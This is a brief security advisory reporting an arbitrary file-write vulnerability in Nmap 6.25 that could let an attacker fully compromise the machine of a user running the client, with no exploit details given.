Nmap is prone to an arbitrary file-write vulnerability.

An attacker can exploit this issue to write arbitrary files with the permissions of the user running the nmap client. This will allow the attacker to fully compromise the affected machine.

Nmap 6.25 is vulnerable; other versions may also be affected.
